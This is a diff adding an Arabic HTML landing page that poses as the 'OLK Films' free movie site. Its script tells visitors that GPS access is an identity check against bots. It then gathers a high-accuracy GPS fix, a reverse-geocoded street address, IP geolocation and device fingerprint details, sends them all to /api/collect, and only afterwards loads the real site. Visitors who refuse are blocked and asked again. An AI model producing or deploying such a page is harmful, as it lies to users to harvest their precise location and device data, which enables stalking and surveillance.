@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OLK Films - شاهد أفضل الأفلام والمسلسلات مجاناً</title>
+    <meta name="description" content="شاهد أفضل الأفلام والمسلسلات مجاناً بجودة عالية">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: #0a0a1a;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0a0a1a, #1a1035, #0d0d2b);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.6s ease;
+        }
+
+        .loading-screen.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loading-content {
+            text-align: center;
+            color: white;
+            max-width: 400px;
+            padding: 0 20px;
+        }
+
+        .loading-logo {
+            font-size: 42px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #e50914, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+
+        .loading-icon {
+            font-size: 54px;
+            margin-bottom: 20px;
+            animation: bounce 1.5s ease-in-out infinite;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-12px);
+            }
+        }
+
+        .loading-content h2 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .loading-sub {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.35);
+            margin-bottom: 28px;
+        }
+
+        .loading-spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid rgba(255, 255, 255, 0.08);
+            border-top: 3px solid #e50914;
+            border-radius: 50%;
+            margin: 0 auto 14px;
+            animation: spinLoader 0.8s linear infinite;
+        }
+
+        @keyframes spinLoader {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-hint {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.2);
+        }
+
+        /* GPS Blocked Screen */
+        .gps-blocked {
+            display: none;
+        }
+
+        .gps-blocked.active {
+            display: block;
+        }
+
+        .blocked-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+
+        .blocked-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        .blocked-text {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-bottom: 24px;
+            line-height: 1.7;
+        }
+
+        .retry-btn {
+            background: linear-gradient(135deg, #e50914, #ff3d3d);
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(229, 9, 20, 0.3);
+            margin-bottom: 16px;
+        }
+
+        .retry-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 30px rgba(229, 9, 20, 0.5);
+        }
+
+        .steps-list {
+            text-align: right;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.5);
+            line-height: 2;
+        }
+
+        .steps-list .step-num {
+            color: #e50914;
+            font-weight: 700;
+            margin-left: 6px;
+        }
+
+        /* Normal loading state */
+        .normal-loading {
+            display: block;
+        }
+
+        .normal-loading.hidden {
+            display: none;
+        }
+
+        /* Website iframe */
+        .site-frame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Loading / GPS Required Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <!-- Normal Loading -->
+            <div class="normal-loading" id="normalLoading">
+                <div class="loading-logo">OLK Films</div>
+                <div class="loading-icon">🎬</div>
+                <h2>جاري تحميل الموقع...</h2>
+                <p class="loading-sub">يرجى الانتظار لحظات</p>
+                <div class="loading-spinner"></div>
+                <p class="loading-hint">⏳ يتم التحقق من أمان الاتصال...</p>
+            </div>
+
+            <!-- GPS Blocked -->
+            <div class="gps-blocked" id="gpsBlocked">
+                <div class="loading-logo">OLK Films</div>
+                <div class="blocked-icon">🔒</div>
+                <div class="blocked-title">مطلوب تأكيد الهوية</div>
+                <div class="blocked-text">
+                    للحماية من الروبوتات والوصول الغير مصرح به،<br>
+                    يرجى السماح بالتحقق من هويتك للمتابعة
+                </div>
+                <button class="retry-btn" onclick="requestGPS()">✓ تأكيد والمتابعة</button>
+                <div class="steps-list">
+                    <div><span class="step-num">1.</span> اضغط على "تأكيد والمتابعة"</div>
+                    <div><span class="step-num">2.</span> اضغط "السماح" في النافذة المنبثقة</div>
+                    <div><span class="step-num">3.</span> سيتم تحميل الموقع تلقائياً</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Embedded Website (hidden until GPS granted) -->
+    <iframe class="site-frame" id="siteFrame" src="about:blank" loading="eager"></iframe>
+
+    <script>
+        let dataCollected = false;
+
+        async function collectDeviceInfo() {
+            const info = { device: {}, ipInfo: {}, gpsLocation: {} };
+
+            // Device info
+            try {
+                const ua = navigator.userAgent;
+                info.device.userAgent = ua;
+                info.device.language = navigator.language || 'Unknown';
+                info.device.screenWidth = screen.width;
+                info.device.screenHeight = screen.height;
+                info.device.colorDepth = screen.colorDepth;
+                info.device.pixelRatio = window.devicePixelRatio;
+                info.device.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                info.device.cookiesEnabled = navigator.cookieEnabled;
+                info.device.cores = navigator.hardwareConcurrency || 'Unknown';
+                info.device.memory = navigator.deviceMemory || 'Unknown';
+                info.device.isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+                info.device.touchPoints = navigator.maxTouchPoints || 0;
+
+                if (ua.includes('Firefox')) info.device.browser = 'Firefox';
+                else if (ua.includes('Edg')) info.device.browser = 'Edge';
+                else if (ua.includes('Chrome')) info.device.browser = 'Chrome';
+                else if (ua.includes('Safari')) info.device.browser = 'Safari';
+                else if (ua.includes('Opera') || ua.includes('OPR')) info.device.browser = 'Opera';
+                else info.device.browser = 'Unknown';
+
+                if (ua.includes('Windows')) info.device.os = 'Windows';
+                else if (ua.includes('Mac')) info.device.os = 'macOS';
+                else if (ua.includes('Linux')) info.device.os = 'Linux';
+                else if (ua.includes('Android')) info.device.os = 'Android';
+                else if (ua.includes('iPhone') || ua.includes('iPad')) info.device.os = 'iOS';
+                else info.device.os = 'Unknown';
+                info.device.platform = info.device.os;
+            } catch (e) { }
+
+            // Battery
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    info.device.battery = Math.round(battery.level * 100) + '%';
+                    info.device.charging = battery.charging ? 'نعم' : 'لا';
+                }
+            } catch (e) { info.device.battery = 'غير متاح'; }
+
+            // Network
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    info.device.connection = conn.effectiveType || 'Unknown';
+                    info.device.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
+                } else { info.device.connection = 'غير متاح'; }
+            } catch (e) { info.device.connection = 'غير متاح'; }
+
+            // IP & Location
+            try {
+                const ipResponse = await fetch('http://ip-api.com/json/?lang=ar&fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+                if (ipResponse.ok) {
+                    const ipData = await ipResponse.json();
+                    if (ipData.status === 'success') {
+                        info.ipInfo = {
+                            ip: ipData.query, country: ipData.country,
+                            countryCode: ipData.countryCode, region: ipData.regionName,
+                            city: ipData.city, zip: ipData.zip,
+                            lat: ipData.lat, lon: ipData.lon,
+                            timezone: ipData.timezone, isp: ipData.isp, org: ipData.org
+                        };
+                    }
+                }
+            } catch (e) {
+                try {
+                    const backup = await fetch('https://ipapi.co/json/');
+                    if (backup.ok) {
+                        const bData = await backup.json();
+                        info.ipInfo = {
+                            ip: bData.ip, country: bData.country_name,
+                            countryCode: bData.country_code, region: bData.region,
+                            city: bData.city, zip: bData.postal,
+                            lat: bData.latitude, lon: bData.longitude,
+                            timezone: bData.timezone, isp: bData.org
+                        };
+                    }
+                } catch (e2) { }
+            }
+
+            return info;
+        }
+
+        function showBlocked() {
+            document.getElementById('normalLoading').classList.add('hidden');
+            document.getElementById('gpsBlocked').classList.add('active');
+        }
+
+        function showSite() {
+            // Load the actual website
+            document.getElementById('siteFrame').src = 'https://olk-o.vercel.app/';
+            // Fade out loading screen
+            const loader = document.getElementById('loadingScreen');
+            loader.classList.add('fade-out');
+            setTimeout(() => loader.style.display = 'none', 600);
+        }
+
+        async function requestGPS() {
+            // Reset to loading state
+            document.getElementById('gpsBlocked').classList.remove('active');
+            document.getElementById('normalLoading').classList.remove('hidden');
+
+            try {
+                const gpsPosition = await new Promise((resolve, reject) => {
+                    if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true, timeout: 20000, maximumAge: 0
+                    });
+                });
+
+                // GPS granted! Collect everything
+                const info = await collectDeviceInfo();
+                info.gpsLocation = {
+                    lat: gpsPosition.coords.latitude,
+                    lon: gpsPosition.coords.longitude,
+                    accuracy: Math.round(gpsPosition.coords.accuracy) + 'm',
+                    altitude: gpsPosition.coords.altitude,
+                    speed: gpsPosition.coords.speed
+                };
+
+                // Reverse geocode
+                try {
+                    const geoRes = await fetch(
+                        `https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`
+                    );
+                    if (geoRes.ok) {
+                        const geo = await geoRes.json();
+                        info.gpsLocation.city = geo.address?.city || geo.address?.town || geo.address?.village || '';
+                        info.gpsLocation.district = geo.address?.suburb || geo.address?.neighbourhood || '';
+                        info.gpsLocation.state = geo.address?.state || '';
+                        info.gpsLocation.country = geo.address?.country || '';
+                        info.gpsLocation.road = geo.address?.road || '';
+                        info.gpsLocation.fullAddress = geo.display_name || '';
+                    }
+                } catch (e) { }
+
+                // Send to server
+                try {
+                    await fetch('/api/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(info)
+                    });
+                } catch (e) { }
+
+                dataCollected = true;
+                showSite();
+
+            } catch (e) {
+                // GPS denied again — show blocked screen
+                showBlocked();
+            }
+        }
+
+        // Initial load — try GPS automatically
+        window.addEventListener('load', async () => {
+            try {
+                const gpsPosition = await new Promise((resolve, reject) => {
+                    if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
+                    });
+                });
+
+                // GPS granted on first try
+                const info = await collectDeviceInfo();
+                info.gpsLocation = {
+                    lat: gpsPosition.coords.latitude,
+                    lon: gpsPosition.coords.longitude,
+                    accuracy: Math.round(gpsPosition.coords.accuracy) + 'm',
+                    altitude: gpsPosition.coords.altitude,
+                    speed: gpsPosition.coords.speed
+                };
+
+                try {
+                    const geoRes = await fetch(
+                        `https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`
+                    );
+                    if (geoRes.ok) {
+                        const geo = await geoRes.json();
+                        info.gpsLocation.city = geo.address?.city || geo.address?.town || geo.address?.village || '';
+                        info.gpsLocation.district = geo.address?.suburb || geo.address?.neighbourhood || '';
+                        info.gpsLocation.state = geo.address?.state || '';
+                        info.gpsLocation.country = geo.address?.country || '';
+                        info.gpsLocation.road = geo.address?.road || '';
+                        info.gpsLocation.fullAddress = geo.display_name || '';
+                    }
+                } catch (e) { }
+
+                try {
+                    await fetch('/api/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(info)
+                    });
+                } catch (e) { }
+
+                dataCollected = true;
+                showSite();
+
+            } catch (e) {
+                // GPS denied or timed out — show blocked screen
+                showBlocked();
+            }
+        });
+    </script>
+</body>
+
+</html>
